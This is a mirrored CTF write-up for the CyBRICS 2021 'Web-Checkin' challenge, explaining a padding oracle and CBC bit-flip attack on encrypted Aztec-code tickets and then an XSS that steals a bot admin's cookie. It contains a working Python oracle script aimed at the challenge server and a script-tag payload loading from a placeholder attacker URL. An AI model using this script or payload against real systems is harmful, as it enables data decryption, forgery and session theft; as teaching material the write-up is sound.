<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="This is the fork of my friend&amp;rsquo;s blog: Writeup for Web-Checkin in CyBRICS CTF 2021. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.
"><title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</title><link rel=canonical href=https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)"><meta property="og:description" content="This is the fork of my friend&amp;rsquo;s blog: Writeup for Web-Checkin in CyBRICS CTF 2021. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.
"><meta property="og:url" content="https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2021-08-02T00:32:27+00:00"><meta property="article:modified_time" content="2021-08-02T00:32:27+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)"><meta name=twitter:description content="This is the fork of my friend&amp;rsquo;s blog: Writeup for Web-Checkin in CyBRICS CTF 2021. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2021/08/02/cybrics-checkin-2021/>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Aug 02, 2021</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><p>This is the fork of my friend&rsquo;s blog: <a class=link href=https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/ target=_blank rel=noopener>Writeup for Web-Checkin in CyBRICS CTF 2021</a>. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.</p><p>[toc]</p><h2 id=tldr>TL;DR</h2><p>Padding Oracle Attack + Bit Flip Attack + XSS</p><p>This is a hard web challenge in <a class=link href=https://cybrics.net/tasks target=_blank rel=noopener>CyBRICS CTF 2021</a>. For some reason, the challenge was ZERO solved during the competition. The author fixed some bug after the competition and announced that anyone who can solve it would receive a reward. We managed to solve it and was one of the only two teams that claimed the reward.</p><h2 id=reconnaissance>Reconnaissance</h2><p>This challenge simulates a flight booking site, where we can search for flight tickets, buy tickets, and upload tickets to be registered.</p><p>By submitting a form on http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx, we will receive a aztec code, which embeds a piece of base64-encoded data.</p><p>We can upload the aztec code through http://207.154.224.121:8080/upload, and get a successful &ldquo;<em>you are now registered</em>&rdquo; response (but this&rsquo;s not what we want).</p><p>Later, we found something interesting after changing some byte of the base64-encoded data. We got a <em>&ldquo;PADDING_ERROR&rdquo;</em> response by modifying some byte of the data. It immediately occurred to us that this might well be an instance of <strong>padding oracle attack</strong>.</p><p>To confirm the intuition we just developed, we generated a aztec code, base64 decoded it into ciphertext, XORed every 256 possible byte value (0~256) in the last byte of the second last ciphertext block, base64 encoded back to a aztec code (utilizing python <code>aztec_code_generator</code> module), and uploaded the aztec code to the server. We received 256 responses, 255 of whose <em>status code</em> is 200, with only one response whose <em>status code</em> is 500. Among the 255 responses, XORing by <code>b"\x00"</code> in the last byte got a &ldquo;<em>Success</em>&rdquo; reponse and the remaining 254 are all &ldquo;PADDING_ERROR&rdquo; responses. This implied that only the &ldquo;<em>Success</em>&rdquo; response one and the 500 <em>status code</em> one got correctly padded plaintext after decryption on the server side. The &ldquo;<em>Success</em>&rdquo; response was due to it&rsquo;s the original unmodified padded plaintext, while the 500 <em>status code</em> one was because the plaintext after decryption was somewhat modified to be correctly padded and we can gain knowledge of the last byte of the original plaintext by making use of this.</p><p>By continously sending carefully modified ciphertext to the server and then distinguishing whether or not the server responses with &ldquo;<em>PADDING_ERROR</em>&rdquo;, we can recover the whole plaintext byte by byte. This is the so-called <a class=link href=https://en.wikipedia.org/wiki/Padding_oracle_attack target=_blank rel=noopener>padding oracle attack</a>.</p><h2 id=padding-oracle-attack>Padding Oracle Attack</h2><p>So, how does the padding oracle attack work?</p><hr><p>First, we need to understand <strong>what is padding</strong>.</p><p>It is known that block ciphers can transform (encrypt/decrypt) a plaintext/ciphertext block. 16 bytes data in the case of AES, into a ciphertext/plaintext block. Using some block cipher mode of operation, we can repeatedly apply the block cipher encrypting/decrypting operation on amouts of data whose length is more than a block. For example, AES-CBC mode can encrypt/decrypt multiple blocks. But what if the length of data is not a multiple of the block length? The answer is to use some kind of padding methods, which append some data at the end of the last block to make it a full block.</p><p>One of the most widely used padding method is <a class=link href=https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS#5_and_PKCS#7 target=_blank rel=noopener>PKCS#7</a> padding method. PKCS#7 first calculates the number of bytes ( <code>pad_length</code>) to be padded, and then appends to the last plaintext block <code>pad_length</code> bytes, with each byte value being <code>pad_length</code>. Upon unpadding, the last byte of the decryption result is extracted and parsed as the <code>pad_length</code>, after which <code>pad_length</code> long bytes are truncated at the end. Below is a Python implementation of PKCS#7 padding and unpadding.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>pad</span><span class=p>(</span><span class=n>pt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pad_length</span> <span class=o>=</span> <span class=mi>16</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>pt</span><span class=p>)</span><span class=o>%</span><span class=mi>16</span>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>pad_length</span><span class=p>])</span> <span class=o>*</span> <span class=n>pad_length</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>unpad</span><span class=p>(</span><span class=n>pt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pad_length</span> <span class=o>=</span> <span class=n>pt</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=mi>1</span> <span class=o>&lt;=</span> <span class=n>pad_length</span> <span class=o>&lt;=</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pad</span><span class=p>(</span><span class=n>pt</span><span class=p>[:</span><span class=o>-</span><span class=n>pad_length</span><span class=p>])</span> <span class=o>!=</span> <span class=n>pt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pt</span><span class=p>[:</span><span class=o>-</span><span class=n>pad_length</span><span class=p>]</span>
</span></span></code></pre></div><p>Note that a valid padding check is done after unpadding. This means that only the following 16 formats of the last block is considered as valid. All the other formats of data are invalid and will produce a <em>PADDING_ERROR</em> response, which is a padding oracle that we will exploit later.</p><blockquote><p>Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being <code>\x10</code>.</p></blockquote><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png loading=lazy alt=image-20210729103443272></a><figcaption>image-20210729103443272</figcaption></figure></p><hr><p>Before moving on, we also need to be fimilar with <strong>AES-CBC</strong>, which is the most common mode that padding oracle attack can be mounted on.</p><p>In CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations.</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png loading=lazy alt=image-20210729140911415></a><figcaption>image-20210729140911415</figcaption></figure></p><p>One significant drawback of AES-CBC is that it does not solely provide intergrity protection. In other words, the attacker can modify the ciphertext (such as bit flipping) and send the modified ciphertext to the server without being noticed. This gives way to the padding oracle attack.</p><hr><p>Now, we can dive into the very details on <strong>how the padding oracle works</strong>.</p><p>Suppose the attack has possession of a ciphertext which can be divided into an <code>IV</code> and 3 ciphertext blocks <code>c1, c2, c3</code> . The purpose of the attacker is to decrypt the last ciphertext block <code>c3</code>.</p><p>The attacker changes the last byte of <code>c2</code> (XORed with some value), and then send it to the server. The server responses with either a &ldquo;<em>PADDING_ERROR</em>&rdquo; response or a 500 <em>status code</em> reponse. If we gets a 500 <em>status code</em> response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with <code>b"\x01</code>, one of the 16 valid padding format.</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png loading=lazy alt=image-20210729175108696></a><figcaption>image-20210729175108696</figcaption></figure></p><p>After recovering the last byte, we can move on to decrypt all the previous bytes of the last plaintext block. For example, to decrypt the second last byte, we can utilize the <code>b"\x02\x02"</code> padding format. Since we already have had knowledge of the last byte of plaintext, we can modify the last byte into any value we want by XOR something in <code>c2</code>. At present, what we want is to make the last byte be <code>b"\x02"</code>, we XOR the last byte of <code>c2</code> with the last byte of plaintext to cancel it into <code>b"\x00"</code>, then XOR in <code>b"\x02"</code>, resulting to <code>b"\x02"</code>. Then, try every 255 possible byte value <code>guess_byte XOR b"\x02"</code> (except <code>b"\x00"</code>) to XOR with the last second byte of <code>c2</code>, and send the modified ciphertext to the padding oracle until a 500 <em>status code</em> response, thus recovering the second last plaintext byte, which is exactly <code>guess_byte</code>.</p><p>The following is the Python code that can be used to, given ciphertext, recover the last plaintext block.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>aztec_code_generator</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># padding_oracle recovers the last 16 plaintext bytes of the given ciphertext</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>padding_oracle</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>index</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>17</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] index: </span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>bytes_xor</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>16</span><span class=o>-</span><span class=n>index</span><span class=p>)</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=n>byte</span><span class=o>^</span><span class=n>index</span><span class=p>])</span><span class=o>+</span><span class=n>xor</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span><span class=nb>bytes</span><span class=p>([</span><span class=n>index</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=n>index</span><span class=o>-</span><span class=mi>1</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=n>new_cipher</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[:</span><span class=o>-</span><span class=mi>32</span><span class=p>]</span> <span class=o>+</span> <span class=n>xor</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=o>-</span><span class=mi>32</span><span class=p>:</span><span class=o>-</span><span class=mi>16</span><span class=p>],</span> <span class=n>bytes_xor</span><span class=p>)</span> <span class=o>+</span> <span class=n>cipher</span><span class=p>[</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>b64data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>new_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>code</span> <span class=o>=</span> <span class=n>aztec_code_generator</span><span class=o>.</span><span class=n>AztecCode</span><span class=p>(</span><span class=n>b64data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>code</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;./pics/</span><span class=si>{</span><span class=n>byte</span><span class=si>}</span><span class=s2>.png&#34;</span><span class=p>,</span> <span class=n>module_size</span><span class=o>=</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;./pics/</span><span class=si>{</span><span class=n>byte</span><span class=si>}</span><span class=s2>.png&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>paramsMultipart</span> <span class=o>=</span> <span class=p>[(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=p>(</span><span class=s1>&#39;1.png&#39;</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=s1>&#39;application/png&#39;</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://207.154.224.121:8080/upload&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>paramsMultipart</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>body</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&lt;div class=&#34;content__i&#34;&gt;&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;div&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;PADDING&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[</span><span class=si>{</span><span class=n>byte</span><span class=si>:</span><span class=s2>&gt;3d</span><span class=si>}</span><span class=s2>] Status code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>, PADDING ERROR&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[</span><span class=si>{</span><span class=n>byte</span><span class=si>:</span><span class=s2>&gt;3d</span><span class=si>}</span><span class=s2>] Status code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>body</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>	<span class=c1># response.status_code == 500</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[</span><span class=si>{</span><span class=n>byte</span><span class=si>:</span><span class=s2>&gt;3d</span><span class=si>}</span><span class=s2>] Status code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>plaintext</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>byte</span><span class=p>])</span> <span class=o>+</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;plaintext: </span><span class=si>{</span><span class=n>plaintext</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>plaintext</span>
</span></span></code></pre></div><h2 id=recovering-the-entire-plaintext>Recovering the Entire Plaintext</h2><p>By exploting the padding oracle, we are enabled to decrypt the last plaintext block byte by byte. Can we go any further? The answer is yes.</p><p>Once we have recovered the last plaintext block, we can drop the last ciphertext block, and continue to exploit the padding oracle to recover the second last plaintext block. Keep doing this, and we will recover all the plaintext blocks, namely the entire plaintext.</p><hr><p>In practice, we implemented the attack and succssfully recovered the entire plaintext, which was a json formatted data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;{&#34;name&#34;: &#34;12321&#34;, &#34;surname&#34;: &#34;123&#34;, &#34;middle&#34;: &#34;1&#34;, &#34;time&#34;: &#34;2021-07-26 13:37:00&#34;, &#34;dest&#34;: &#34;&#34;, &#34;dep&#34;: &#34;&#34;, &#34;flight&#34;: &#34;BLZH1337&#34;}</span><span class=se>\x02\x02</span><span class=s1>&#39;</span>
</span></span></code></pre></div><p>At this point, we got to know how the server side might process the uploaded aztec code. After receiving the code, the server decoded it into ciphertext, decrypted the ciphertext, and unpadded the decryption result. If something wrong happened during unpadding, the server replied with a &ldquo;<em>PADDING_ERROR</em>&rdquo; response. After unpadding, the plaintext was then unmarshaled into an object (by something like <code>JSON.parse()</code>). If any error occurred, the server replied with a 500 <em>status code</em> response. The server would send back us a &ldquo;Success&rdquo; response if everything&rsquo;s ok.</p><h2 id=arbitrary-plaintext-encryption>Arbitrary Plaintext Encryption</h2><p>Recovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want.</p><p>To achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext.</p><p>Say the ciphertext <code>IV || c1 || c2 || c3</code> decrypts into <code>p1 || p2 || p3</code>, and we want to get the ciphertext of <code>p1' || p2' || p3</code>.</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png loading=lazy alt=image-20210729181535279></a><figcaption>image-20210729181535279</figcaption></figure></p><p>We first XOR <code>c1</code> with <code>p2 XOR p2'</code> to get <code>c1'</code>. In this way, <code>IV || c1' || c2 || c3</code> will be decrypted into <code>junk || p2' || p3</code>.</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png loading=lazy alt=image-20210729181301243></a><figcaption>image-20210729181301243</figcaption></figure></p><p>The nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by <code>JSON.parse()</code>. What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR <code>IV</code> with <code>junk XOR p1'</code> to get a new <code>IV'</code>. In this way, <code>IV' || c1' || c2 || c3</code> will be decrypted into <code>p1' || p2' || p3</code>, which is exactly we want!</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png loading=lazy alt=image-20210729182312222></a><figcaption>image-20210729182312222</figcaption></figure></p><h2 id=the-xss-part>The XSS Part</h2><p>So we could encrypt what we want now. What should we do next? According to the description of the challenge, we have to go and get the content of the central surveillance system to get the information of Mr.Flag Flagger. But how?</p><p>Let&rsquo;s take a look at the json. There may be a bot in the backend use <code>JSON.parse()</code> to parse the json and some method to render a page with these json data. For example, <code>res.render("render.html", name=json.name, surname=json.surname)</code>. So we could try to inject a XSS vector into the plaintext, encrypt it and then send the payload to the bot through the upload API.</p><p>But, at first we need to understand the correspondence between API parameters and JSON parameters. After do a test, we generate a ciphertext through the <code>/finalize</code> API and decrypt the ciphertext to get the correspondence.</p><pre tabindex=0><code>URL:
http://207.154.224.121:8080/finalize?lastName=1&amp;firstName=2&amp;origin=3&amp;Gender=4&amp;destination=5

CipherText:
8BAHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3N

PlainText:
b&#39;{&#34;name&#34;: &#34;2&#34;, &#34;surname&#34;: &#34;1&#34;, &#34;middle&#34;: &#34;4&#34;, &#34;time&#34;: &#34;2021-07-26 13:37:00&#34;, &#34;dest&#34;: &#34;5&#34;, &#34;dep&#34;: &#34;3&#34;, &#34;flight&#34;: &#34;BLZH1337&#34;}&#39;
</code></pre><p>Okay. But which one we should inject the XSS vector? You could try one by one but I think there is a hint in the source code of the challenge.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>&lt;h2&gt;Passenger data&lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=c>&lt;h3&gt;Name:&lt;/h3&gt;
</span></span></span><span class=line><span class=cl><span class=c>&lt;h4&gt;qweqwe&lt;/h4&gt;
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span></code></pre></div><p>It looks like the Name is what we want. So we should craft a payload like this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;script src=http://your_url/?2&gt;&lt;/script&gt;&#34;</span><span class=p>,</span> <span class=nt>&#34;surname&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=nt>&#34;middle&#34;</span><span class=p>:</span> <span class=s2>&#34;4&#34;</span><span class=p>,</span> <span class=nt>&#34;time&#34;</span><span class=p>:</span> <span class=s2>&#34;2021-07-26 13:37:00&#34;</span><span class=p>,</span> <span class=nt>&#34;dest&#34;</span><span class=p>:</span> <span class=s2>&#34;5&#34;</span><span class=p>,</span> <span class=nt>&#34;dep&#34;</span><span class=p>:</span> <span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=nt>&#34;flight&#34;</span><span class=p>:</span> <span class=s2>&#34;BLZH1337&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p>When we generate the ciphertext, we first need to generate a cipher whose the length of the name parameter is the same length as the name parameter in the XSS payload we constructed. In this exmaple, the name is <code>&lt;script src=http://your_url/?2>&lt;/script></code> and its length is 40. Therefore, we should generate a ciphertext with a name of length 40 through the <code>/finalize</code> API. And we&rsquo;d better leave the other parameters as default values.</p><pre tabindex=0><code>URL:
http://207.154.224.121:8080/finalize?lastName=1&amp;firstName=0000000000000000000000000000000000000000&amp;origin=3&amp;Gender=4&amp;destination=5

PlainText:
b&#39;{&#34;name&#34;: &#34;0000000000000000000000000000000000000000&#34;, &#34;surname&#34;: &#34;1&#34;, &#34;middle&#34;: &#34;4&#34;, &#34;time&#34;: &#34;2021-07-26 13:37:00&#34;, &#34;dest&#34;: &#34;5&#34;, &#34;dep&#34;: &#34;3&#34;, &#34;flight&#34;: &#34;BLZH1337&#34;}&#39;
</code></pre><p>After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping. And then use base64 and aztec code to encode the ciphertext and upload the aztec code. At last, XSS fires!<figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png loading=lazy></a></figure></p><p>Now, we get the admin&rsquo;s cookie and the source code of the admin&rsquo;s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched &lsquo;Flagger&rsquo; as described in the challenge and got the flag.</p><p><figure><a href=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png><img src=https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png loading=lazy></a></figure></p><p>Thanks for your reading. Hope you like the writeup! XD</p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link 